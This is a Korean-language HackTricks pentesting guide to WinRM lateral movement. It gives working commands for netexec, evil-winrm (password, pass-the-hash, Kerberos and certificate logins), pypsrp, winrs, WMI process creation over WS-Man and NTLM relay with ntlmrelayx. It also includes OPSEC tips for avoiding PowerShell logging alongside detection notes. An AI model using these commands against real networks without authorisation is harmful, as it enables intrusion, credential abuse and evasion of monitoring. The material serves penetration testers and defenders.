# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM은 SMB service creation tricks 없이 **WS-Man/HTTP(S)**를 통해 원격 shell을 제공하므로 Windows 환경에서 가장 편리한 **lateral movement** 전송 방식 중 하나입니다. 대상이 **5985/5986**을 노출하고 있고 principal에 remoting 사용 권한이 있다면, "valid creds"에서 "interactive shell"까지 매우 빠르게 이동할 수 있습니다.

**protocol/service enumeration**, listeners, WinRM 활성화, `Invoke-Command`, 일반적인 client 사용법은 다음을 확인하세요:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Operator가 WinRM을 선호하는 이유

- SMB/RPC 대신 **HTTP/HTTPS**를 사용하므로 PsExec-style execution이 차단된 환경에서도 작동하는 경우가 많습니다.
- **Kerberos**를 사용하면 재사용 가능한 credentials를 대상에 전송하지 않습니다.
- **Windows**, **Linux**, **Python** tooling(`winrs`, `evil-winrm`, `pypsrp`, `netexec`)에서 원활하게 작동합니다.
- Interactive PowerShell remoting 경로는 인증된 user context에서 대상에 **`wsmprovhost.exe`**를 생성하며, 이는 service-based exec와 운영상 다릅니다.

## Access model 및 prerequisites

실제로 성공적인 WinRM lateral movement는 다음 **세 가지**에 달려 있습니다:

1. 대상에 **WinRM listener**(`5985`/`5986`)가 있고, firewall rules가 access를 허용해야 합니다.
2. account가 endpoint에 **authenticate**할 수 있어야 합니다.
3. account가 **remoting session을 열 수 있는** 권한을 가져야 합니다.

이 access를 얻는 일반적인 방법은 다음과 같습니다:

- 대상의 **Local Administrator**.
- 최신 시스템에서는 **Remote Management Users**의 membership, 또는 해당 group을 여전히 적용하는 시스템/components에서는 **WinRMRemoteWMIUsers__**의 membership.
- Local security descriptors / PowerShell remoting ACL changes를 통해 명시적으로 위임된 remoting rights.

이미 admin rights로 한 box를 제어하고 있다면, 여기 설명된 techniques를 사용해 **full admin group membership 없이도 WinRM access를 delegate**할 수 있다는 점을 기억하세요:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### lateral movement 중 중요한 Authentication gotchas

- **Kerberos에는 hostname/FQDN이 필요합니다**. IP로 연결하면 client는 일반적으로 **NTLM/Negotiate**로 fallback합니다.
- **workgroup** 또는 cross-trust edge cases에서는 NTLM에 일반적으로 **HTTPS**가 필요하거나, client에서 대상을 **TrustedHosts**에 추가해야 합니다.
- Workgroup에서 Negotiate를 통해 **local accounts**를 사용하면 UAC remote restrictions로 인해 access가 차단될 수 있습니다. 이 경우 built-in Administrator account를 사용하거나 `LocalAccountTokenFilterPolicy=1`로 설정해야 합니다.
- PowerShell remoting은 기본적으로 **`HTTP/<host>` SPN**을 사용합니다. **`HTTP/<host>`가 이미 다른 service account에 등록된 환경에서는** WinRM Kerberos가 `0x80090322`와 함께 실패할 수 있습니다. Port-qualified SPN을 사용하거나 해당 SPN이 존재하는 경우 **`WSMAN/<host>`**로 전환하세요.<sup>[[3]](#references)</sup>

Password spraying 중 valid credentials를 확보했다면, WinRM을 통해 이를 검증하는 것이 shell로 이어지는지 확인하는 가장 빠른 방법인 경우가 많습니다:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux-to-Windows lateral movement

### 검증 및 one-shot execution을 위한 NetExec / CrackMapExec
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### 대화형 shell을 위한 Evil-WinRM

`evil-winrm`은 **password**, **NT hash**, **Kerberos ticket**, **client certificate**, file transfer, 그리고 메모리 내 PowerShell/.NET loading을 지원하므로 Linux에서 가장 편리한 대화형 옵션으로 남아 있습니다.
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Kerberos SPN 특수 사례: `HTTP` vs `WSMAN`

기본 **`HTTP/<host>`** SPN으로 인해 Kerberos failures가 발생하면 대신 **`WSMAN/<host>`** ticket을 요청하거나 사용해 보세요. 이는 **`HTTP/<host>`**가 이미 다른 service account에 연결된 hardened 또는 특이한 enterprise setup에서 나타납니다.<sup>[[3]](#references)</sup>
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
이는 일반적인 `HTTP` 티켓이 아니라 **WSMAN** service ticket을 특별히 위조하거나 요청한 경우, **RBCD / S4U** abuse 이후에도 유용합니다.

### Certificate-based authentication

WinRM은 **client certificate authentication**도 지원하지만, 해당 certificate는 대상에서 **local account**에 매핑되어 있어야 합니다. 공격 관점에서는 다음과 같은 경우에 중요합니다.

- WinRM에 이미 매핑된 유효한 client certificate와 private key를 탈취하거나 export한 경우
- **AD CS / Pass-the-Certificate**를 abuse하여 특정 principal에 대한 certificate를 획득한 후 다른 authentication path로 pivot하는 경우
- password-based remoting을 의도적으로 사용하지 않는 환경에서 작업하는 경우
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Client-certificate WinRM은 password/hash/Kerberos auth보다 훨씬 덜 일반적이지만, 존재하는 경우 password rotation 이후에도 지속되는 **passwordless lateral movement** 경로를 제공할 수 있습니다.

### Python / `pypsrp`를 사용한 automation

operator shell이 아닌 automation이 필요하다면, `pypsrp`는 **NTLM**, **certificate auth**, **Kerberos**, **CredSSP**를 지원하는 Python용 WinRM/PSRP를 제공합니다.<sup>[[2]](#references)</sup>
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
고수준 `Client` wrapper보다 더 세밀하게 제어해야 하는 경우, 하위 수준의 `WSMan` + `RunspacePool` API는 다음과 같은 두 가지 일반적인 operator 문제에 유용합니다.

- 많은 PowerShell client에서 사용하는 기본 `HTTP` expectation 대신 **`WSMAN`** 을 Kerberos service/SPN으로 강제;
- `Microsoft.PowerShell` 대신 **JEA** / custom session configuration과 같은 **non-default PSRP endpoint**에 연결.
```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan(
"srv01.domain.local",
auth="kerberos",
ssl=False,
negotiate_service="WSMAN",
)

with wsman, RunspacePool(wsman, configuration_name="MyJEAEndpoint") as pool, PowerShell(pool) as ps:
ps.add_script("whoami; Get-Command")
output = ps.invoke()
print(output)
```
### lateral movement 중 Custom PSRP endpoints 및 JEA의 중요성

성공적인 WinRM authentication이 항상 기본 unrestricted `Microsoft.PowerShell` endpoint에 진입한다는 의미는 아닙니다. 성숙한 환경에서는 자체 ACLs 및 run-as 동작을 갖춘 **custom session configurations** 또는 **JEA** endpoints를 노출할 수 있습니다.<sup>[[1]](#references)</sup>

이미 Windows host에서 code execution을 확보했고 어떤 remoting surfaces가 존재하는지 파악하려는 경우, 등록된 endpoints를 열거합니다:
```powershell
Get-PSSessionConfiguration | Select-Object Name, Permission
```
유용한 endpoint가 있는 경우 기본 shell 대신 해당 endpoint를 명시적으로 대상으로 지정하세요:
```powershell
Enter-PSSession -ComputerName srv01.domain.local -ConfigurationName MyJEAEndpoint
```
실전 offensive 관점의 의미:

- **restricted** endpoint라도 서비스 제어, 파일 액세스, 프로세스 생성 또는 임의의 .NET / external command execution에 필요한 cmdlets/functions만 노출한다면 lateral movement에 충분히 활용할 수 있습니다.
- **misconfigured JEA** role은 `Start-Process`, 광범위한 wildcard, 쓰기 가능한 provider 또는 의도된 제한을 벗어날 수 있게 하는 custom proxy functions와 같은 위험한 commands를 노출할 때 특히 유용합니다.
- **RunAs virtual accounts** 또는 **gMSAs**가 backing하는 endpoint는 실행하는 commands의 유효 security context를 변경합니다. 특히 gMSA-backed endpoint는 일반적인 WinRM session에서 고전적인 delegation 문제에 부딪히는 경우에도 **second hop에서 network identity**를 제공할 수 있습니다.

## Windows-native WinRM lateral movement

### `winrs.exe`

`winrs.exe`는 기본 제공되며 interactive PowerShell remoting session을 열지 않고 **native WinRM command execution**을 수행하려 할 때 유용합니다:
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
실무에서 잊기 쉽지만 중요한 플래그가 두 가지 있습니다:

- `/noprofile`은 원격 주체가 **로컬 관리자**가 아닌 경우 필요한 경우가 많습니다.
- `/allowdelegate`는 원격 셸이 **제3의 호스트**에 대해 사용자의 자격 증명을 사용할 수 있게 합니다(예: 명령에 `\\fileserver\share`가 필요한 경우).
```cmd
winrs -r:srv01.domain.local /noprofile cmd /c set
winrs -r:srv01.domain.local /allowdelegate cmd /c dir \\fileserver.domain.local\share
```
운영 측면에서 `winrs.exe`는 일반적으로 다음과 유사한 원격 프로세스 체인을 생성합니다:
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
기억해 둘 가치가 있습니다. 이는 service-based exec 및 interactive PSRP sessions와 다릅니다.

### `winrm.cmd` / PowerShell remoting 대신 WS-Man COM

`Enter-PSSession` 없이 WS-Man을 통해 WMI classes를 호출하여 **WinRM transport**로 실행할 수도 있습니다. 이 경우 transport는 WinRM으로 유지되지만, remote execution primitive은 **WMI `Win32_Process.Create`**가 됩니다.
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
해당 접근 방식은 다음과 같은 경우에 유용합니다:

- PowerShell logging을 면밀하게 모니터링하는 경우
- **WinRM transport**를 사용하면서도 일반적인 PS remoting workflow는 사용하지 않으려는 경우
- **`WSMan.Automation`** COM object를 기반으로 custom tooling을 구축하거나 사용하는 경우

## NTLM relay to WinRM (WS-Man)

SMB relay가 signing으로 차단되고 LDAP relay가 제한된 경우에도 **WS-Man/WinRM**은 여전히 매력적인 relay target일 수 있습니다. 최신 `ntlmrelayx.py`에는 **WinRM relay servers**가 포함되어 있으며, **`wsman://`** 또는 **`winrms://`** targets로 relay할 수 있습니다.
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
두 가지 실용적인 참고 사항:

- 대상이 **NTLM**을 허용하고 relay된 principal이 WinRM을 사용할 수 있는 권한을 가진 경우 Relay가 가장 유용합니다.
- 최신 Impacket 코드는 **`WSMANIDENTIFY: unauthenticated`** 요청을 특별히 처리하므로 `Test-WSMan` 스타일의 probe가 relay 흐름을 중단시키지 않습니다.

첫 번째 WinRM 세션을 획득한 후 multi-hop 제약 조건은 다음을 참고하세요:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## OPSEC 및 탐지 참고 사항

- **Interactive PowerShell remoting**은 일반적으로 대상에 **`wsmprovhost.exe`**를 생성합니다.
- **`winrs.exe`**는 일반적으로 **`winrshost.exe`**를 생성한 다음 요청된 child process를 생성합니다.
- Custom **JEA** endpoint는 **`WinRM_VA_*`** virtual account 또는 구성된 **gMSA**로 작업을 실행할 수 있으며, 일반적인 user-context shell과 비교해 telemetry와 second-hop 동작이 모두 달라집니다.<sup>[[1]](#references)</sup>
- PSRP를 raw `cmd.exe` 대신 사용하는 경우 **network logon** telemetry, WinRM service event, PowerShell operational/script-block logging이 발생할 수 있습니다.
- 단일 command만 필요한 경우 `winrs.exe` 또는 one-shot WinRM execution이 오래 실행되는 interactive remoting session보다 조용할 수 있습니다.
- Kerberos를 사용할 수 있다면 IP + NTLM보다 **FQDN + Kerberos**를 선호하세요. 이렇게 하면 trust issue와 client-side `TrustedHosts` 변경 문제를 모두 줄일 수 있습니다.

## References

- [1] [Microsoft: JEA Security Considerations](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.6)
- [2] [pypsrp README](https://github.com/jborean93/pypsrp)
- [3] [Microsoft: WinRM을 통해 PowerShell을 원격 서버에 연결할 때 발생하는 오류 `0x80090322`](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)


{{#include ../../banners/hacktricks-training.md}}
